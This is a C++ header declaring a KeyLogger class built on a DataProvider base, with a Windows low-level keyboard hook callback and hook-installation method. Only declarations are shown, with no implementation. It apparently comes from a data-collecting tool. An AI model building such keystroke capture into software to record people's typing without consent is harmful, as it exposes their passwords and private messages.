#pragma once
#include <windows.h>
#include "DataProvider.h"

class KeyLogger : public DataProvider
{
public:
	KeyLogger();
	~KeyLogger();

	void Init();
	void Finalize();
                  
protected:
	PSTR GetName();
	PSTR GetExtension();

private:
    void InstallHook(void);

	static LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam );
	//static LRESULT CALLBACK LowLevelKeyboardProcWrapper( int nCode, WPARAM wParam, LPARAM lParam );

	bool mHookReleased;
	HHOOK mHook;
};
